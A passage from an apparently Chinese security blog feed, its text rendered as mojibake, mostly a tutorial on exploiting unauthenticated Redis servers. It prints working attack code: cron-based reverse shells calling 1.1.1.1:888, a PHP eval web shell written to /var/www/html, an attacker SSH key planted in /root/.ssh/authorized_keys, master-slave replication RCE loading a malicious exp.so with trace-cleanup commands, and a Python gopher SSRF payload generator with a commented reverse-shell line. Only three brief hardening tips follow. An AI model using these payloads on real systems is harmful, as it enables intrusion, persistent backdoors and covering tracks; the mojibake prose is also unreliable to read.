<li><p>session.upload_progress.cleanupï¼šè¯»å–æ‰€æœ‰POSTæ•°æ®ï¼ˆå³å®Œæˆä¸Šä¼ ï¼‰åï¼Œç«‹å³æ¸…ç†è¿›åº¦ä¿¡æ¯ï¼Œé»˜è®¤å¯ç”¨</p>
</li>
<li><p>session.upload_progress.prefixï¼šé…ç½®<code>$ _SESSION</code>ä¸­ç”¨äºä¸Šä¼ è¿›åº¦é”®çš„å‰ç¼€ï¼Œé»˜è®¤ä¸ºupload_progress_</p>
</li>
<li><p>session.upload_progress.nameï¼š<code>$ _SESSION</code>ä¸­ç”¨äºå­˜å‚¨è¿›åº¦ä¿¡æ¯çš„é”®çš„åç§°ï¼Œé»˜è®¤ä¸ºPHP_SESSION_UPLOAD_PROGRESS</p>
</li>
<li><p>session.upload_progress.freqï¼šå®šä¹‰åº”è¯¥å¤šé•¿æ—¶é—´æ›´æ–°ä¸€æ¬¡ä¸Šä¼ è¿›åº¦ä¿¡æ¯</p>
</li>
<li><p>session.upload_progress.min_freqï¼šæ›´æ–°ä¹‹é—´çš„æœ€å°å»¶è¿Ÿ</p>
</li>
<li><p>session.lazy_writeï¼šé…ç½®ä¼šè¯æ•°æ®åœ¨æ›´æ”¹æ—¶æ˜¯å¦è¢«é‡å†™ï¼Œé»˜è®¤å¯ç”¨</p>
</li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>Redisæœªæˆæƒè®¿é—®</title>
    <url>/2020/08/30/redis_unauthorized_access/</url>
    <content><![CDATA[<h2 id="redisæœªæˆæƒè®¿é—®"><a href="#redisæœªæˆæƒè®¿é—®" class="headerlink" title="redisæœªæˆæƒè®¿é—®"></a>redisæœªæˆæƒè®¿é—®</h2><h3 id="0X00-redisçš„æœªæˆæƒè®¿é—®ç®€ä»‹"><a href="#0X00-redisçš„æœªæˆæƒè®¿é—®ç®€ä»‹" class="headerlink" title="0X00 redisçš„æœªæˆæƒè®¿é—®ç®€ä»‹"></a>0X00 redisçš„æœªæˆæƒè®¿é—®ç®€ä»‹</h3><ul>
<li>Redisåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œç»‘å®šåœ°å€ä¸º127.0.0.1:6379ï¼Œåœ¨ä¸é€‚å½“æ“ä½œä¸‹ï¼Œä¼šç»‘å®šåœ°å€ä¸º0.0.0.0:6379ï¼Œä¸”æ— é‡‡ç”¨é™åˆ¶IPè®¿é—®ï¼Œå°†ä¼šæŠŠRedisæœåŠ¡ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå†åŠ ä¸Šè‹¥æ— è®¾ç½®å¯†ç è®¤è¯ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·æœªæˆæƒè®¿é—®Redisä»¥åŠè¯»å–Redisæ•°æ®å¹¶å†™å…¬é’¥è¿›è¡Œè¿œç¨‹è¿æ¥ç­‰ï¼Œç”šè‡³getshell</li>
</ul>
<h3 id="0X01-crontab-getshell"><a href="#0X01-crontab-getshell" class="headerlink" title="0X01 crontab-getshell"></a>0X01 crontab-getshell</h3><ul>
<li>åœ¨Linuxç³»ç»Ÿä¸­æœ‰å®šæ—¶ä»»åŠ¡çš„åŠŸèƒ½ï¼Œåªè¦æ–‡ä»¶å¯ä»¥å†™å…¥åˆ°å®šæ—¶ä»»åŠ¡ç›®å½•é‡Œé¢å°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li>
<li>ä»»åŠ¡ç›®å½•<ul>
<li>/var/spool/cron/ç”¨æˆ·å</li>
<li>/var/spool/cron/crontabs/ç”¨æˆ·å</li>
<li>/etc/crontab</li>
<li>/etc/cron.d/xxx</li>
</ul>
</li>
<li>reids-cliå®¢æˆ·ç«¯å†™crontab</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/1.1.1.1/888 0&gt;&amp;1\n&quot;  //åå¼¹ç«¯å£888çš„shell</span><br><span class="line">config set dir /var/spool/cron/  //è®¾ç½®ä¿å­˜çš„è·¯å¾„</span><br><span class="line">config set dbfilename root  //è®¾ç½®æ•°æ®åº“æ–‡ä»¶å</span><br><span class="line">save  //æ•°æ®åº“ä¿å­˜ï¼Œä¿ƒå‘åå¼¹</span><br></pre></td></tr></table></figure>

<ul>
<li>å†™crontabçš„ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $redis = new Redis();</span><br><span class="line">    $redis-&gt;connect(&apos;192.168.0.110&apos;,6380);</span><br><span class="line">    $redis-&gt;flushall();</span><br><span class="line">    $redis-&gt;set(&quot;xxx&quot;,&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/1.1.1.1/888 0&gt;&amp;1\n&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dir&quot;,&quot;/var/spool/cron/&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dbfilename&quot;,&quot;root&quot;);</span><br><span class="line">    $redis-&gt;save();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>â–² Ubuntuä¸‹çš„crontabå¯¹å†™å…¥çš„æ•°æ®æœ‰è¦æ±‚ï¼Œä¸èƒ½å‡ºç°ä¹±ç ï¼Œä½†rediså†™å…¥çš„æ—¶å€™ï¼Œä¼šå°†é…ç½®ä»¥åŠç¼“å­˜æ•°æ®ä¸€èµ·å†™å…¥ï¼Œæ‰€ä»¥æ— æ³•æ‰§è¡Œä»»åŠ¡ï¼Œæ‰§è¡Œä»»åŠ¡ä¼šå‡ºé”™</li>
<li>â–² Ubuntuä¸‹çš„crontabæ‰§è¡Œä»»åŠ¡ä½¿ç”¨çš„æ˜¯/bin/dashï¼Œæ— æ³•è§¦å‘æ‰§è¡Œå®šæ—¶ä»»åŠ¡ï¼Œéœ€è¦ä¿®æ”¹ä¸º/bin/bashæ‰èƒ½è§¦å‘æ‰§è¡Œä»»åŠ¡</li>
</ul>
<h3 id="0X02-web-getshell"><a href="#0X02-web-getshell" class="headerlink" title="0X02 web-getshell"></a>0X02 web-getshell</h3><ul>
<li>å‰æ<ul>
<li>webçš„ç»å¯¹è·¯å¾„</li>
<li>redisæœ‰è¶³å¤Ÿçš„æƒé™</li>
</ul>
</li>
<li>å†™shellçš„ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $redis = new Redis();</span><br><span class="line">    $redis-&gt;connect(&apos;192.168.0.110&apos;,6380);</span><br><span class="line">    $redis-&gt;flushall();</span><br><span class="line">    $redis-&gt;set(&quot;xxx&quot;,&quot;\n&lt;?php eval(\$_GET[&apos;cmd&apos;]);?&gt;\n&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dir&quot;,&quot;/var/www/html/&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dbfilename&quot;,&quot;root.php&quot;);</span><br><span class="line">    $redis-&gt;save();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/redis/web_getshell.png" alt="web-getshell"></p>
<h3 id="0X03-ssh-getshell"><a href="#0X03-ssh-getshell" class="headerlink" title="0X03 ssh-getshell"></a>0X03 ssh-getshell</h3><ul>
<li>é€šè¿‡å†™.sshæ–‡ä»¶ä¸‹çš„authorized_keyè¿›è¡Œgetshell</li>
<li>å†™å…¥æˆåŠŸåé€šè¿‡ç»ˆç«¯è®¾å¤‡è¿›è¡Œè¿æ¥</li>
<li>å†™authorized_keyçš„ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $str = &quot;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAg8kuNZfIZbHB5Ek5ZPo8SERdxKV7NpLPIpOyAGUXYAZW5k1I4S0+G9wGkcIrJ2kS/cc681NrDjxGlLXXQ/4uWclTGOcLud477Q0pyG1C9AHLQpprcrujbb0mEAuqUfw4F1Nhltz3WdxgdFuJT/dgQ8SJskudh3coUSh5ipjwKEUWmAXTkMfWxU/VJ2DD1n5imOvBqEVEoquy8GXtylLt70ijp481gkSEDoQP3TqTKKbZWEN63d4p7xff+1ZgQHuuWzbmw8G6bWrWWdO7k2k4117lWJi2lJYm4//eauP85iEoqRCm4UBWcnZ6dmGHt4U1oTeGOeyqAQxoJ2/0sdmLjQ== rsa-key-20200612&quot;;</span><br><span class="line">    $redis = new Redis();</span><br><span class="line">    $redis-&gt;connect(&apos;122.51.135.129&apos;,6379);</span><br><span class="line">    $redis-&gt;select(1);</span><br><span class="line">    $redis-&gt;flushall();</span><br><span class="line">    $redis-&gt;set(&quot;xxx&quot;,&quot;\n\n&quot;.$str.&quot;\n\n&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dir&quot;,&quot;/root/.ssh&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dbfilename&quot;,&quot;authorized_keys&quot;);</span><br><span class="line">    $redis-&gt;save();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/redis/authorized_key_getshell.png" alt="authorized_key_getshell"></p>
<h3 id="0X04-ä¸»ä»å¤åˆ¶getshell"><a href="#0X04-ä¸»ä»å¤åˆ¶getshell" class="headerlink" title="0X04 ä¸»ä»å¤åˆ¶getshell"></a>0X04 ä¸»ä»å¤åˆ¶getshell</h3><ul>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>ä½æƒçš„æ—¶å€™ï¼Œredisä»¥rootæƒé™è¿è¡Œï¼Œé€šè¿‡RCEè·å¾—rootæƒé™</li>
<li>æœªæˆæƒç›´æ¥åˆ©ç”¨</li>
</ul>
</li>
<li>ä¸»ä»æ¨¡å¼æµ‹è¯•</li>
</ul>
<p><img src="/images/middleware/redis/slaveof-test.png" alt="slaveof-test"></p>
<ul>
<li>æ¼æ´åˆ©ç”¨ï¼šæ¼æ´å­˜åœ¨äº4.xã€5.xç‰ˆæœ¬ä¸­ï¼ŒRedisæä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼æŒ‡ä½¿ç”¨ä¸€ä¸ªredisä½œä¸ºä¸»æœºï¼Œå…¶ä»–çš„ä½œä¸ºå¤‡ä»½æœºï¼Œä¸»æœºä»æœºæ•°æ®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ã€‚åœ¨Reids 4.xä¹‹åï¼Œé€šè¿‡å¤–éƒ¨æ‹“å±•ï¼Œå¯ä»¥å®ç°åœ¨redisä¸­å®ç°ä¸€ä¸ªæ–°çš„Rediså‘½ä»¤ï¼Œæ„é€ æ¶æ„.soæ–‡ä»¶ã€‚åœ¨ä¸¤ä¸ªRediså®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedisçš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡FULLRESYNCåŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Šã€‚ç„¶ååœ¨ä»æœºä¸ŠåŠ è½½æ¶æ„soæ–‡ä»¶ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤</li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨å·¥å…·"><a href="#æ¼æ´åˆ©ç”¨å·¥å…·" class="headerlink" title="æ¼æ´åˆ©ç”¨å·¥å…·"></a>æ¼æ´åˆ©ç”¨å·¥å…·</h5><ul>
<li>ç”Ÿæˆmodule.soæ–‡ä»¶ <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" target="_blank" rel="noopener">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></li>
<li>rce-1 <a href="https://github.com/Ridter/redis-rce.git" target="_blank" rel="noopener">https://github.com/Ridter/redis-rce.git</a></li>
<li>rce-2 <a href="https://github.com/LoRexxar/redis-rogue-server" target="_blank" rel="noopener">https://github.com/LoRexxar/redis-rogue-server</a></li>
<li>åˆ©ç”¨è¿‡ç¨‹<ul>
<li>ä¸‹è½½module.soæ–‡ä»¶ï¼Œè¿›è¡Œmakeç¼–è¯‘ï¼Œç”Ÿæˆä¸€ä¸ªmodule.so</li>
<li>å°†moduleå¤åˆ¶åˆ°redis-rceçš„ç›®å½•ä¸­ï¼Œé€šè¿‡ç»ˆç«¯æ‰§è¡Œå‘½ä»¤<code>python redis-rce.py -r ç›®æ ‡ip -p ç›®æ ‡ç«¯å£ -L æœ¬åœ°ip -f module.so</code>ï¼Œè¿›è€Œè·å–shell</li>
</ul>
</li>
</ul>
<h5 id="redis-rceçš„å¤§è‡´åŸç†"><a href="#redis-rceçš„å¤§è‡´åŸç†" class="headerlink" title="redis-rceçš„å¤§è‡´åŸç†"></a>redis-rceçš„å¤§è‡´åŸç†</h5><ul>
<li>é‡‡ç”¨pythonä¼ªè£…æˆredisæ•°æ®åº“ï¼Œç„¶åå—å®³è€…å°†æˆ‘ä»¬çš„æ•°æ®åº“è®¾ç½®ä¸ºä¸»èŠ‚ç‚¹</li>
<li>å°†å¤‡ä»½çš„rdbæ•°æ®åº“å¤‡ä»½æ–‡ä»¶å†…å®¹æ›¿æ¢ä¸ºæ¶æ„çš„soæ–‡ä»¶</li>
<li>è®¾ç½®ä¼ è¾“æ–¹å¼ä¸ºå…¨é‡ä¼ è¾“ï¼Œå°±ä¼šè‡ªåŠ¨åœ¨èŠ‚ç‚¹redisä¸­ç”Ÿæˆexp.so</li>
<li>ç”¨module loadå‘½ä»¤åŠ è½½soæ–‡ä»¶å³å¯å®Œæˆrce</li>
<li>â–² é‡ç‚¹æ˜¯æ”¯æŒå…¨é‡ä¼ è¾“</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.è¯»å–exp.so</span><br><span class="line">2.è°ƒç”¨runserverå‡½æ•°å¤„ç†runserver(options.rhost, options.rport, options.lhost, options.lport) #ç›®æ ‡IPã€ç›®æ ‡ç«¯å£ã€attack IPã€attackç›‘å¬çš„ç«¯å£ï¼ˆé»˜è®¤ç›‘å¬21000ç«¯å£ï¼‰</span><br><span class="line">3.è°ƒç”¨Remote.do() #å‘é€Rediså¯†ç éªŒè¯ï¼Œå¹¶è¿”å›ç»“æœï¼Œå¦‚æœè¿”å›invalid passwordä»£è¡¨å¯†ç é”™è¯¯</span><br><span class="line">4.å¯†ç æ­£ç¡®ï¼Œredisç™»å½•æˆåŠŸåï¼Œå‘é€infoæŒ‡ä»¤æŸ¥çœ‹redisæ•°æ®åº“è¯¦ç»†ä¿¡æ¯</span><br><span class="line">5.å‘é€SLAVEOFæŒ‡ä»¤ï¼ŒæŒ‡ä»¤æ ¼å¼ SLAVEOF host port #ä½œç”¨é€šè¿‡æ‰§è¡Œ SLAVEOF host port å‘½ä»¤ï¼Œå¯ä»¥å°†å½“å‰æœåŠ¡å™¨è½¬å˜ä¸ºæŒ‡å®šæœåŠ¡å™¨çš„ä»å±æœåŠ¡å™¨(slave server)ï¼Œè¿™é‡Œçš„hostå’Œportåˆ™æŒ‡å‘attackçš„IPå’Œç«¯å£</span><br><span class="line">6.å‘é€CONFIG SET dbfilename &lt;name&gt; è®¾ç½®æ–‡ä»¶åç§°(æ ¹æ®exp.soçš„æ–‡ä»¶åæ¥è®¾ç½®çš„æ–‡ä»¶åï¼Œæ¯”å¦‚exp.soã€‚è®¾ç½®çš„dbfilenameå°±æ˜¯exp)</span><br><span class="line">7.ç›‘å¬æœ¬æœº21000ç«¯å£ï¼Œç­‰å¾…rediså›ä¼ çš„æ•°æ®ã€‚æ ¹æ®è¿”å›çš„ç»“æœå°†expè½¬æ¢æˆbytesï¼Œå‘é€exp</span><br><span class="line">8.MODULE LOADæŒ‡ä»¤åŠ è½½exp.so</span><br><span class="line">9.å–æ¶ˆä»å±æœåŠ¡å™¨</span><br><span class="line">10.æ ¹æ®é€‰æ‹©æ˜¯è¿›å…¥shellæˆ–è€…æ‰§è¡Œå…¶ä»–æŒ‡ä»¤</span><br><span class="line">12.è‹¥æ˜¯æ‰§è¡ŒshellæŒ‡ä»¤ï¼Œåˆ™è°ƒç”¨exp.soé‡Œé¢çš„system.execå‡½æ•°åé¢è·Ÿä¸Šå‘½ä»¤ã€‚system.exec &lt;command&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/redis/slaveof-getshell.png" alt="slaveof-getshell"></p>
<h5 id="æœ¬åœ°æ‰‹å·¥æ‰§è¡Œå‘½ä»¤è®¾ç½®å¤‡ä»½"><a href="#æœ¬åœ°æ‰‹å·¥æ‰§è¡Œå‘½ä»¤è®¾ç½®å¤‡ä»½" class="headerlink" title="æœ¬åœ°æ‰‹å·¥æ‰§è¡Œå‘½ä»¤è®¾ç½®å¤‡ä»½"></a>æœ¬åœ°æ‰‹å·¥æ‰§è¡Œå‘½ä»¤è®¾ç½®å¤‡ä»½</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.config set dir ./</span><br><span class="line">2.config set dbfilename exp.so</span><br><span class="line">3.slaveof X.X.X.195</span><br><span class="line">4.slaveof X.X.X.195 21000  #ä¸Šé¢çœ‹ç»‘å®šçš„æœåŠ¡æ®µç«¯å£æ˜¯21000</span><br><span class="line">5. module load ./exp.so</span><br><span class="line">6.slaveof no one</span><br><span class="line">7.system.exec &apos;whoami&apos;</span><br><span class="line"></span><br><span class="line">æ¸…ç†ç—•è¿¹</span><br><span class="line">8.config set dbfilename dump.rdb</span><br><span class="line">9.system.exec &apos;rm ./exp.so&apos;</span><br><span class="line">10.module unload system</span><br></pre></td></tr></table></figure>

<h5 id="ç¦ç”¨configå‘½ä»¤ç»•è¿‡"><a href="#ç¦ç”¨configå‘½ä»¤ç»•è¿‡" class="headerlink" title="ç¦ç”¨configå‘½ä»¤ç»•è¿‡"></a>ç¦ç”¨configå‘½ä»¤ç»•è¿‡</h5><ul>
<li>å¦‚æœåœ¨redis.confé…ç½®äº†ç¦ç”¨configå‘½ä»¤çš„æ—¶å€™ </li>
<li>ç»•è¿‡æ–¹æ³•</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rename-command CONFIG &quot;&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>é™åˆ¶<ul>
<li>è™½ç„¶æ­¤æ—¶æ²¡æœ‰åŠæ³•è‡ªå®šä¹‰æ–‡ä»¶åç¼€ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥åˆ©ç”¨ä¸»ä»å¤åˆ¶</li>
<li>åç»­åªéœ€è¦æŠŠdump.rdpå½“æˆexp.soå»æ­£å¸¸åŠ è½½å³å¯</li>
</ul>
</li>
</ul>
<h3 id="0X04-åè®®è¯»å–redis"><a href="#0X04-åè®®è¯»å–redis" class="headerlink" title="0X04 åè®®è¯»å–redis"></a>0X04 åè®®è¯»å–redis</h3><ul>
<li>â–² rediså®˜æ–¹ä½¿ç”¨çš„RESPåè®®</li>
<li>å®¢æˆ·ç«¯ä¸redisæœåŠ¡ç«¯çš„äº¤äº’æµç¨‹<ul>
<li>å®¢æˆ·ç«¯å‘RedisæœåŠ¡å™¨å‘é€ä¸€ä¸ªä»…ç”±Bulk Stringsç»„æˆçš„RESP Arrays</li>
<li>RedisæœåŠ¡å™¨å›å¤å‘é€ä»»ä½•æœ‰æ•ˆRESPæ•°æ®ç±»å‹ä½œä¸ºå›å¤çš„å®¢æˆ·ç«¯</li>
</ul>
</li>
<li>Bulk Stringsç”¨äºè¡¨ç¤ºé•¿åº¦æœ€å¤§ä¸º512 MBçš„å•ä¸ªäºŒè¿›åˆ¶å®‰å…¨å­—ç¬¦ä¸²ï¼ŒæŒ‰ä»¥ä¸‹æ–¹å¼ç¼–ç ï¼š<ul>
<li>ä¸€ä¸ª$å­—èŠ‚åè·Ÿç»„æˆå­—ç¬¦ä¸²çš„å­—èŠ‚æ•°ï¼ˆä¸€ä¸ªå‰ç¼€é•¿åº¦ï¼‰ï¼Œç”±CRLFç»ˆæ­¢ã€‚</li>
<li>å®é™…çš„å­—ç¬¦ä¸²æ•°æ®</li>
<li>æœ€ç»ˆçš„CRLF</li>
<li>å¦‚å­—ç¬¦ä¸²foobarç¼–ç åä¸º$6\r\nfoobar\r\n</li>
</ul>
</li>
<li>RESP Arraysä½¿ç”¨ä»¥ä¸‹æ ¼å¼å‘é€<ul>
<li>ä¸€ä¸ª*å­—ç¬¦ä½œä¸ºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œåè·Ÿæ•°ç»„ä¸­çš„å…ƒç´ æ•°ä½œä¸ºåè¿›åˆ¶æ•°ï¼Œåè·ŸCRLF</li>
<li>æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½é™„åŠ RESPç±»å‹</li>
</ul>
</li>
<li>æ•°æ®åŒ…çš„ç†è§£<ul>
<li>æ¯ä¸€ä¸ª*numberä»£è¡¨æ¯ä¸€è¡Œå‘½ä»¤ï¼Œnumberä»£è¡¨æ¯è¡Œå‘½ä»¤ä¸­æ•°ç»„ä¸­çš„å…ƒç´ ä¸ªæ•°ã€‚$numberä»£è¡¨æ¯ä¸ªå…ƒç´ çš„é•¿åº¦</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*1</span><br><span class="line">$8</span><br><span class="line">flushall</span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$1</span><br><span class="line">1</span><br><span class="line">$22</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">//ä»£è¡¨çš„å‘½ä»¤è¡Œ</span><br><span class="line">flushall</span><br><span class="line">set 1 &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="gopheråè®®"><a href="#gopheråè®®" class="headerlink" title="gopheråè®®"></a>gopheråè®®</h5><ul>
<li>gopheræ”¯æŒå¤šè¡Œï¼Œä¹Ÿå³å¯ä»¥è¿›è¡Œæ”»å‡»éœ€è¦è®¤è¯çš„redis</li>
<li>æ ¼å¼ï¼šgopher://ip:port/_<ul>
<li>è¦åœ¨ä¼ è¾“æ•°æ®å‰åŠ ä¸€ä¸ªæ— ç”¨çš„å­—ç¬¦ï¼Œgopheråè®®ä¼šå°†ç¬¬ä¸€ä¸ªå­—ç¬¦â€åƒæ‰â€</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//éæ ‡å‡†çš„è¯·æ±‚</span><br><span class="line">curl &quot;gopher://127.0.0.1:6379/_auth%20root%0d%0aset%20a%20test&quot;</span><br><span class="line"></span><br><span class="line">//æ ‡å‡†çš„è¯·æ±‚ï¼ˆRESPæ ¼å¼ï¼‰</span><br><span class="line">curl &quot;gopher://127.0.0.1:6379/_*3%0d%0A%243%0d%0Aset%0d%0A%241%0d%0A1%0d%0A%243%0d%0A123&quot;</span><br></pre></td></tr></table></figure>

<h5 id="dictåè®®"><a href="#dictåè®®" class="headerlink" title="dictåè®®"></a>dictåè®®</h5><ul>
<li>dictæ ¼å¼ä¸æ”¯æŒå¤šè¡Œï¼Œä¹Ÿå³æ— æ³•æ”»å‡»éœ€è¦è®¤è¯çš„redis</li>
<li>æ ¼å¼ï¼šdict://serverip:port/name:data<ul>
<li>å‘æœåŠ¡å™¨çš„ç«¯å£è¯·æ±‚name dataï¼Œå¹¶åœ¨æœ«å°¾ è‡ªåŠ¨è¡¥ä¸Šrn(CRLF)ç»“æœæµ‹è¯•å…¶å®è¿˜ä¼šå‘é€ä¸€ä¸ªQUIT</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &quot;dict://127.0.0.1:6379/set:1:123&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨å®éªŒä¸­å‘ç°ï¼Œæ”¯æŒå•è¡Œçš„commandæ‰§è¡Œå‘é€ï¼Œä¸éœ€è¦clientç«¯å‘é€CLINETçš„å‘½ä»¤ï¼Œè™½ç„¶å­˜åœ¨æŠ¥é”™ï¼Œä½†æ˜¯è¿˜æ˜¯æˆåŠŸæ‰§è¡Œ</li>
</ul>
<p><img src="/images/middleware/redis/dict-client.png" alt="dict-client"></p>
<h3 id="é€šç”¨åˆ©ç”¨è„šæœ¬"><a href="#é€šç”¨åˆ©ç”¨è„šæœ¬" class="headerlink" title="é€šç”¨åˆ©ç”¨è„šæœ¬"></a>é€šç”¨åˆ©ç”¨è„šæœ¬</h3><ul>
<li>è„šæœ¬æ¥è‡ªxq17å¸ˆå‚…</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*-coding:utf-8-*-</span><br><span class="line"># author:xq17</span><br><span class="line"></span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">def tranToResp(x):</span><br><span class="line">        xSplit = x.split(&quot; &quot;)</span><br><span class="line">        cmd=&quot;&quot;</span><br><span class="line">        cmd+=&quot;*&quot;+str(len(xSplit))</span><br><span class="line">        for i in xSplit:</span><br><span class="line">            i = i.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class="line">            cmd+=&quot;\r\n&quot;+&quot;$&quot;+str(len(i))+&quot;\r\n&quot;+ i</span><br><span class="line">        cmd+=&quot;\r\n&quot;</span><br><span class="line">        return cmd</span><br><span class="line"></span><br><span class="line">def GeneratePayload(ip, port):</span><br><span class="line">    cmd=[</span><br><span class="line">     &quot;config set dir ./&quot;,</span><br><span class="line">     &quot;config set dbfilename exp.so&quot;,</span><br><span class="line">     &quot;slaveof &#123;i&#125; &#123;p&#125;&quot;.format(i=ip, p=port),</span><br><span class="line">     &quot;module load exp.so&quot;,</span><br><span class="line">     &quot;system.exec ls&quot;,</span><br><span class="line">     &quot;system.exec rm$&#123;IFS&#125;exp.so&quot;,</span><br><span class="line">     &quot;quit&quot;,</span><br><span class="line">     ]</span><br><span class="line">     # &quot;system.exec bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;$&#123;IFS&#125;/dev/tcp/192.168.8.103/4607$&#123;IFS&#125;0&gt;&amp;1&quot;,</span><br><span class="line">    payload = &quot;&quot;</span><br><span class="line">    for p in cmd:</span><br><span class="line">        payload += urllib.parse.quote(tranToResp(p))</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # target</span><br><span class="line">    ip = &quot;127.0.0.1&quot;</span><br><span class="line">    port = &quot;6383&quot;</span><br><span class="line">    # server load exp.so</span><br><span class="line">    serverIp = &quot;101.x.x.x&quot;</span><br><span class="line">    serverPort = &quot;21000&quot;</span><br><span class="line">    authPass = &quot;123123&quot;</span><br><span class="line">    payload = GeneratePayload(serverIp, serverPort)</span><br><span class="line">    exitPayload = (urllib.parse.quote(tranToResp(&quot;slaveof no one&quot;) + tranToResp(&quot;quit&quot;) ))</span><br><span class="line">    if authPass:</span><br><span class="line">        print(&quot;author attack:&quot;)</span><br><span class="line">        pd = &quot;gopher://&#123;host&#125;:&#123;port&#125;/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24&#123;l&#125;%0d%0a&#123;p&#125;%0d%0a&quot;</span><br><span class="line">        pd = pd.format(host=ip, port=port, l=str(len(authPass)), p=authPass)</span><br><span class="line">        print(pd + payload)</span><br><span class="line">        print(&quot;clean footprint:&quot;)</span><br><span class="line">        print(pd + exitPayload)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;no author attack:&quot;)</span><br><span class="line">        pd = &quot;gopher://&#123;host&#125;:&#123;port&#125;/_&quot;</span><br><span class="line">        print(pd.format(host=ip, port=port)+payload)</span><br><span class="line">        print(&quot;clean footprint:&quot;)</span><br><span class="line">        print(pd.format(host=ip, port=port) + exitPayload)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="é˜²èŒƒæªæ–½"><a href="#é˜²èŒƒæªæ–½" class="headerlink" title="é˜²èŒƒæªæ–½"></a>é˜²èŒƒæªæ–½</h3><ul>
<li>è®¾ç½®æœ¬æœºæ‰èƒ½è®¿é—®</li>
<li>è®¾ç½®å¤æ‚æ€§å¯†ç </li>
<li>redis-serverä¸ä»¥rootæƒé™è¿è¡Œ</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="http://www.vkxss.top/2019/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bubuntu%E5%8F%8D%E5%BC%B9shell%E9%97%AE%E9%A2%98/index.html" target="_blank" rel="noopener">Ubuntuä¸‹rediså†™crontabé‡åˆ°çš„å‘</a></li>
<li><a href="https://paper.seebug.org/1169/" target="_blank" rel="noopener">ç»†æ•°redisçš„å‡ ç§getshellæ–¹æ³•</a></li>
<li><a href="https://www.freebuf.com/vuls/224235.html" target="_blank" rel="noopener">è®°ä¸€æ¬¡Redis+Getshellç»éªŒåˆ†äº«</a></li>
<li><a href="https://www.cnblogs.com/kismetv/p/9236731.html" target="_blank" rel="noopener">æ·±å…¥å­¦ä¹ Redisï¼ˆ3ï¼‰ï¼šä¸»ä»å¤åˆ¶</a></li>
